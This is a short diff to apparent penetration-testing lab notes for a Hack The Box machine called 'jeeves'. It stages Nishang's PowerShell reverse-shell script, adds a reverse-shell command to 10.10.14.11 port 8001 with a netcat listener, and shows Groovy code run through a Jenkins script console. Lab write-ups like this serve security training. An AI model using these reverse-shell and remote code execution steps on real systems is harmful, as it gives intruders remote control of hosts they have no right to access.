@@ -11,6 +11,10 @@ https://github.com/samratashok/nishang
 
 root@oscp:/opt/powershell/nishang/Shells# cp Invoke-PowerShellTcp.ps1 ~/Documents/htb/jeeves/www
 
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 8001
+
+nc -lvnp 8001
+
 http://10.10.10.63:50000/askjeeves/script:
 cmd = """ cmd.exe /c echo "Hello World" """
 println cmd.execute().text
